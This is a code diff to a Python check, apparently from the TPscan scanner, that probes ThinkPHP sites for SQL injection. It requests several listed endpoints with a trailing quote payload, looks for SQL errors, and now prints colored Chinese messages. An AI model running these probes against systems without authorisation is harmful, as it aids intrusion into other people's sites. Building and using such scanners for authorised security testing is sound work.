@@ -3,20 +3,24 @@
 import urllib
 import requests
 import urllib3
+
 urllib3.disable_warnings()
+from termcolor import colored
+
 
 def thinkphp_multi_sql_leak_verify(url):
+    """ thinkphp_multi_sql_leak_verify"""
     pocdict = {
-        "vulnname":"thinkphp_multi_sql_leak",
+        "vulnname": "thinkphp_multi_sql_leak",
         "isvul": False,
-        "vulnurl":"",
-        "payload":"",
-        "proof":"",
-        "response":"",
-        "exception":"",
+        "vulnurl": "",
+        "payload": "",
+        "proof": "",
+        "response": "",
+        "exception": "",
     }
     headers = {
-        "User-Agent" : 'TPscan',
+        "User-Agent": 'TPscan',
     }
     payloads = [
         r'index.php?s=/home/shopcart/getPricetotal/tag/1%27',
@@ -29,6 +33,7 @@ def thinkphp_multi_sql_leak_verify(url):
         r'index.php?s=/home/order/cancel/id/1%27',
     ]
     try:
+        status = 0;
         for payload in payloads:
             vurl = urllib.parse.urljoin(url, payload)
             req = requests.get(vurl, headers=headers, timeout=15, verify=False)
@@ -36,9 +41,12 @@ def thinkphp_multi_sql_leak_verify(url):
                 pocdict['isvul'] = True
                 pocdict['vulnurl'] = vurl
                 pocdict['proof'] = 'SQL syntax found'
-                pocdict['response'] = req.text
-                print(pocdict)
+                pocdict['response'] = req.status_code
+                print(colored("[+] 目标存在 thinkphp_multi_sql_leak 漏洞\tpayload: ", "green"))
+                print(colored(pocdict, 'green'))
+                status = 1
                 break
-
+        if status == 0:
+            print(colored("\n[*] 目标不存在 thinkphp_multi_sql_leak 漏洞", "red"))
     except:
-        pass
+        print(colored("\n[*] 目标不存在 thinkphp_multi_sql_leak 漏洞", "red"))
